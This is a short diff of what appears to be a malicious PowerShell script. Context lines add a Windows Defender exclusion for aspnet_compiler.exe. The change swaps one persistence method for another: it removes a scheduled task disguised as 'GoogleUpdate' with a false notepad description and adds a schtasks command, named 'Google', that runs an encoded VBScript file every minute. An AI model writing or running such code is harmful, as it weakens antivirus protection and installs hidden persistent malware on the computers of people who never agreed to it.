@@ -29,6 +29,4 @@ Add-MpPreference -ExclusionProcess aspnet_compiler.exe
 	
 }
 
-$action = New-ScheduledTaskAction -Execute 'C:\Program Files\updata.vbe'
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "GoogleUpdate" -Description "This is a test task. Its job is to start notepad every 1 minutes."
+schtasks.exe /create /tn Google /sc minute  /st 00:10 /tr C:\Program Files\updata.vbe
